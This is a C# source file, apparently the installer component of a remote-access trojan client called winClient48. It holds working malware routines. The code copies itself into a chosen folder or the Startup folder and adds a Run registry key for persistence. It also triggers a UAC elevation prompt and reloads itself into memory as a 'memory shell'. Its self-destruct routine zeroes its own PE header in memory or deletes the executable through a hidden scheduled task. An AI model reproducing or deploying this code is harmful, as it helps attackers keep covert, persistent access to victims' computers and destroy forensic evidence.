using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace winClient48
{
    internal class Installer
    {
        public bool m_bCopyDir { get; set; }
        public bool m_bStartUp { get; set; }
        public bool m_bReg { get; set; }
        public bool m_bUAC { get; set; }

        public string m_szCurrentPath { get; set; }
        public string m_szCopyPath { get; set; }
        public string m_szStartUpName { get; set; }

        public string m_szRegKeyName { get; set; }

        private RegistryKey reg_key;

        public Installer()
        {
            reg_key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        }

        /// <summary>
        /// Start installer.
        /// </summary>
        public void Start()
        {
            Copy();
            
            if (m_bReg)
            {
                RegRun();
            }
        }

        /// <summary>
        /// Copy to specified directory.
        /// </summary>
        private void Copy()
        {
            if (m_bCopyDir)
            {
                if (!File.Exists(m_szCopyPath))
                {
                    File.Copy(m_szCurrentPath, m_szCopyPath, true);
                    new Process()
                    {
                        StartInfo = new ProcessStartInfo()
                        {
                            FileName = m_szCopyPath,
                        }
                    }.Start();

                    Environment.Exit(0);
                }
            }
            if (m_bStartUp)
            {
                if (!File.Exists(m_szStartUpName))
                {
                    File.Copy(m_szCurrentPath, m_szStartUpName, true);
                    Process.Start(m_szStartUpName);

                    Environment.Exit(0);
                }
            }
        }

        /// <summary>
        /// Registry install.
        /// </summary>
        private void RegRun()
        {
            reg_key.SetValue(m_szRegKeyName, m_szCurrentPath);
        }

        public void RegRemove()
        {
            reg_key.DeleteValue(m_szRegKeyName);
        }

        /// <summary>
        /// UAC priviledge escalation.
        /// </summary>
        public void UAC()
        {
            if (!Form1.isAdmin())
            {
                ProcessStartInfo info = new ProcessStartInfo()
                {
                    FileName = Process.GetCurrentProcess().MainModule.FileName,
                    UseShellExecute = true,
                    Verb = "runas", //TRIGGER THE UAC PROMPT
                };
                Process.Start(info);
            }
        }

        /// <summary>
        /// Memory shell
        /// </summary>
        public void LoadToMemory()
        {
            string szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
            byte[] abExeBytes = File.ReadAllBytes(szCurrentPath);

            Thread thd = new Thread(() =>
            {
                Assembly asm = Assembly.Load(abExeBytes);
                MethodInfo entry = asm.EntryPoint;

                if (entry != null)
                {
                    object[] objParam = entry.GetParameters().Length == 0 ? null : new object[] { new string[0] };
                    entry.Invoke(null, objParam);
                }
            });
            
            thd.SetApartmentState(ApartmentState.STA);
            thd.Start();

            SelfDestroy(szCurrentPath);
            Environment.Exit(0);
        }

        public (int, string) SelfDestroy(string szPath)
        {
            int nCode = 0;
            string szMsg = string.Empty;

            try
            {
                if (!File.Exists(Process.GetCurrentProcess().MainModule.FileName)) //Fileless
                {
                    Process.GetCurrentProcess().Kill();
                }
                else if (Assembly.GetEntryAssembly() == null) //DLL
                {
                    const uint PAGE_READWRITE = 0x04;
                    const uint dwSize = 0x1000;
                    IntPtr lpBaseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;

                    WinAPI.VirtualProtect(lpBaseAddress, (UIntPtr)dwSize, PAGE_READWRITE, out uint oldProtect);
                    for (int i = 0; i < 0x1000; i++)
                        Marshal.WriteByte(lpBaseAddress + i, 0);
                }
                else
                {
                    string szExePath = Application.ExecutablePath;
                    string szTaskName = Guid.NewGuid().ToString("N");
                    string szCmd = $"cmd.exe /C timeout 3 && del \"{szExePath}\" && ";

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "schtasks",
                        Arguments = $"/Create /SC ONCE /TN \"{szTaskName}\" /TR \"{szCmd}\" /ST {DateTime.Now.AddMinutes(1).ToString("HH:mm")} /F",
                        UseShellExecute = false,
                        CreateNoWindow = true,

                    })?.WaitForExit();

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "schtasks",
                        Arguments = $"/Run /TN \"{szTaskName}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,

                    })?.WaitForExit();
                }

                nCode = 1;
            }
            catch (Exception ex)
            {
                szMsg = ex.Message;
            }

            return (nCode, szMsg);
        }
    }
}
